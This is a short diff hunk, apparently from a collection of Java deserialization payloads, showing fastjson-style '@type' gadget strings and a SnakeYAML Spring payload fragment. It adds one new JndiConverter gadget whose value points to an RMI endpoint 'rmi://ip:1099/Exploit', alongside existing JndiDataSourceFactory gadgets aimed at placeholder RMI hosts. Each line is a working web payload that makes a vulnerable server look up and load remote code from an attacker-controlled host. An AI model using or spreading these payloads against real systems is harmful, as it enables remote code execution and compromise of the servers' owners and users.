@@ -22,3 +22,6 @@ String payload = "!!org.springframework.beans.factory.config.PropertyPathFactory
 {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://vps:port/TouchFile"}}
 {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"2333","initial_context":"rmi://ip:port/TouchFile"}}
 
+
+
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://ip:1099/Exploit"}
